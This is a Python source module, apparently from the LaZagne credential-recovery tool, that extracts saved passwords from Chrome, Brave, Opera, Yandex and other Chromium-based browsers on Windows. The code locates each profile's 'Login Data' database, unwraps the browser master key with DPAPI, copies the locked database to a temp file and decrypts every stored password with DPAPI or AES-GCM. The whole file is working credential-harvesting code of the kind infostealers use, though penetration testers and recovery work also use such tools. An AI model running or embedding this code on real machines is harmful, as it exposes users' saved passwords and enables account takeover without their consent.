# -*- coding: utf-8 -*-
import base64
import json
import os
import random
import shutil
import sqlite3
import string
import tempfile
import traceback

from Crypto.Cipher import AES

from lazagne.config.constant import constant
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import Win32CryptUnprotectData
from lazagne.softwares.windows.credman import Credman


class ChromiumBased(ModuleInfo):
    def __init__(self, browser_name, paths):
        self.paths = paths if isinstance(paths, list) else [paths]
        self.database_query = 'SELECT action_url, username_value, password_value FROM logins'
        ModuleInfo.__init__(self, browser_name, 'browsers', winapi_used=True)

    def _get_database_dirs(self):
        """
        Return database directories for all profiles within all paths
        """
        databases = set()
        for path in [p.format(**constant.profile) for p in self.paths]:
            profiles_path = os.path.join(path, u'Local State')
            if os.path.exists(profiles_path):
                master_key = None
                # List all users profile (empty string means current dir, without a profile)
                profiles = {'Default', ''}

                # Automatic join all other additional profiles
                for dirs in os.listdir(path):
                    dirs_path = os.path.join(path, dirs)
                    if os.path.isdir(dirs_path) and dirs.startswith('Profile'):
                        profiles.add(dirs)

                with open(profiles_path) as f:
                    try:
                        data = json.load(f)
                        # Add profiles from json to Default profile. set removes duplicates
                        profiles |= set(data['profile']['info_cache'])
                    except Exception:
                        pass

                with open(profiles_path) as f:
                    try:
                        master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
                        master_key = master_key[5:]  # removing DPAPI
                        master_key = Win32CryptUnprotectData(master_key, is_current_user=constant.is_current_user,
                                                user_dpapi=constant.user_dpapi)
                    except Exception:
                        master_key = None

                # Each profile has its own password database
                for profile in profiles:
                    # Some browsers use names other than "Login Data"
                    # Like YandexBrowser - "Ya Login Data", UC Browser - "UC Login Data.18"
                    try:
                        db_files = os.listdir(os.path.join(path, profile))
                    except Exception:
                        continue
                    for db in db_files:
                        if db.lower() in ['login data', 'ya passman data']:
                            databases.add((os.path.join(path, profile, db), master_key))
        return databases

    def _decrypt_v80(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except:
            pass

    def _export_credentials(self, db_path, is_yandex=False, master_key=None):
        """
        Export credentials from the given database

        :param unicode db_path: database path
        :return: list of credentials
        :rtype: tuple
        """
        credentials = []
        yandex_enckey = None

        if is_yandex:
            try:
                credman_passwords = Credman().run()
                for credman_password in credman_passwords:
                    if b'Yandex' in credman_password.get('URL', b''):
                        if credman_password.get('Password'):
                            yandex_enckey = credman_password.get('Password')
                            self.info('EncKey found: {encKey}'.format(encKey=repr(yandex_enckey)))
            except Exception:
                self.debug(traceback.format_exc())
                # Passwords could not be decrypted without encKey
                self.info('EncKey has not been retrieved')
                return []

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(self.database_query)
        except Exception:
            self.debug(traceback.format_exc())
            return credentials

        for url, login, password in cursor.fetchall():
            try:
                # Yandex passwords use a masterkey stored on windows credential manager
                # https://yandex.com/support/browser-passwords-crypto/without-master.html
                if is_yandex and yandex_enckey:
                    try:
                        try:
                            p = json.loads(str(password))
                        except Exception:
                            p = json.loads(password)

                        password = base64.b64decode(p['p'])
                    except Exception:
                        # New version does not use json format
                        pass

                    # Passwords are stored using AES-256-GCM algorithm
                    # The key used to encrypt is stored on the credential manager

                    # yandex_enckey: 
                    #   - 4 bytes should be removed to be 256 bits 
                    #   - these 4 bytes correspond to the nonce ? 

                    # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
                    # plaintext = cipher.decrypt(password)
                    # Failed...
                else:
                    # Decrypt the Password
                    try:
                        password_bytes = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
                                                                user_dpapi=constant.user_dpapi)
                    except AttributeError:
                        try:
                            password_bytes = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
                                                                 user_dpapi=constant.user_dpapi)
                        except:
                            password_bytes = None

                    if password_bytes is not None:
                        password = password_bytes.decode("utf-8")
                    elif master_key:
                        password = self._decrypt_v80(password, master_key)

                if not url and not login and not password:
                    continue

                credentials.append((url, login, password))
            except Exception:
                self.debug(traceback.format_exc())

        conn.close()
        return credentials

    def copy_db(self, database_path):
        """
        Copying db will bypass lock errors
        Using user tempfile will produce an error when impersonating users (Permission denied)
        A public directory should be used if this error occured (e.g C:\\Users\\Public)
        """
        random_name = ''.join([random.choice(string.ascii_lowercase) for i in range(9)])
        root_dir = [
            tempfile.gettempdir(),
            os.environ.get('PUBLIC', None),
            os.environ.get('SystemDrive', None) + '\\',
        ]
        for r in root_dir:
            try:
                temp = os.path.join(r, random_name)
                shutil.copy(database_path, temp)
                self.debug(u'Temporary db copied: {db_path}'.format(db_path=temp))
                return temp
            except Exception:
                self.debug(traceback.format_exc())
        return False

    def clean_file(self, db_path):
        try:
            os.remove(db_path)
        except Exception:
            self.debug(traceback.format_exc())

    def run(self):
        credentials = []
        for database_path, master_key in self._get_database_dirs():
            is_yandex = False if 'yandex' not in database_path.lower() else True

            # Remove Google Chrome false positif
            if database_path.endswith('Login Data-journal'):
                continue

            self.debug('Database found: {db}'.format(db=database_path))

            # Copy database before to query it (bypass lock errors)
            path = self.copy_db(database_path)
            if path:
                try:
                    credentials.extend(self._export_credentials(path, is_yandex, master_key))
                except Exception:
                    self.debug(traceback.format_exc())
                self.clean_file(path)

        return [{'URL': url, 'Login': login, 'Password': password} for url, login, password in set(credentials)]


# Name, path or a list of paths
chromium_browsers = [
    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
    (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
    (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
    (u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
    (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
    (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
    (u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data')
]

chromium_browsers = [ChromiumBased(browser_name=name, paths=paths) for name, paths in chromium_browsers]
